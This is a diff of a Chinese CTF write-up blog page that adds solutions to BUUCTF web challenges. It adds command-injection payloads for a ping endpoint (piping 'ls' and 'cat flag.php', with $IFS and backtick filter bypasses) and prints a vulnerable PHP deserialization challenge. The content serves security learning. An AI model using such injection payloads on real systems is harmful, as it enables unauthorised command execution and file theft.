@@ -114,8 +114,15 @@
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_0.PNG">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Include/Include_1.PNG">
 <meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GXYCTF2019_REC/rce.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg">
 <meta property="article:published_time" content="2020-03-14T09:13:19.000Z">
-<meta property="article:modified_time" content="2020-05-10T14:44:43.085Z">
+<meta property="article:modified_time" content="2020-05-13T14:11:03.094Z">
 <meta property="article:author" content="w1ndy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG">
@@ -316,8 +323,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-05-10T22:44:43+08:00">
-                2020-05-10
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-13T22:11:03+08:00">
+                2020-05-13
               </time>
             
           </span>
@@ -377,7 +384,7 @@
       
 
       
-        <h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p><img src="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG" alt=""><br>一个登陆框，登录名应该是admin，直接爆破<br>密码爆破后为123<br>登陆成功，拿到flag</p>
+        <h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p><img src="http://q63cs67co.bkt.clouddn.com/buuctf_login_1.PNG" alt=""><br>一个登陆框，登录名应该是admin，直接爆破<br>密码爆破后为123<br>登陆成功，拿到flag</p>
 <a id="more"></a>
 <h3 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h3><p>f12查看源码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -403,6 +410,19 @@
 <p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GXYCTF2019_REC/rce.jpg" alt=""><br>此时flag.php在数组中的第三个，接下来就是要想办法读取flag.php的内容</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
 <p>current(localeconv())来构造出获取当前目录的’.’<br>array_reverse():以相反的元素顺序返回数组<br>next():将内部指针指向数组中的下一个元素，并输出<br>highlight_file():打印输出或者返回文件中语法高亮的代码</p>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce0.jpg" alt=""><br>get方式传入参数ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce1.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
+<p>命令执行漏洞<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce2.jpg" alt=""><br>发现了flag.php，接下来就是要想办法读出flag<br>测试一下cat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|cat flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce3.jpg" alt=""><br>看来过滤了空格，可以使用’,’代替，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|&#123;cat,flag.php&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg" alt=""><br>看来把’{}’也过滤了,使用内联执行绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|cat<span class="variable">$IFS</span><span class="variable">$1</span>`ls`</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg" alt=""></p>
+<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$img</span>)&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = array(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,<span class="variable">$filter_arr</span>).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">''</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="built_in">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'function'</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'phpinfo();'</span>); //maybe you can find something <span class="keyword">in</span> here!</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在代码最下方发现如果$function == ‘phpinfo’，就可以访问phpinfo，它说那里有提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=phpinfo</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg" alt=""><br>接下来就是想办法读取d0g3_f1ag.php</p>
 
       
     </div>
@@ -520,7 +540,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -569,7 +589,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-text">[HCTF 2018]admin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#HCTF-2018-admin"><span class="nav-text">[HCTF 2018]admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Havefun"><span class="nav-text">[极客大挑战 2019]Havefun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Knife"><span class="nav-text">[极客大挑战 2019]Knife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-Http"><span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Include"><span class="nav-text">[ACTF2020 新生赛]Include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-BackupFile"><span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ACTF2020-新生赛-Exec"><span class="nav-text">[ACTF2020 新生赛]Exec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安洵杯-2019-easy-serialize-php"><span class="nav-text">[安洵杯 2019]easy_serialize_php</span></a></li></ol></div>
             
 
           </div>
@@ -604,7 +624,7 @@
 
   
 </div>
-
+<!--
 
   <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
@@ -616,7 +636,7 @@
 
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
 
-
+-->
 
 
         
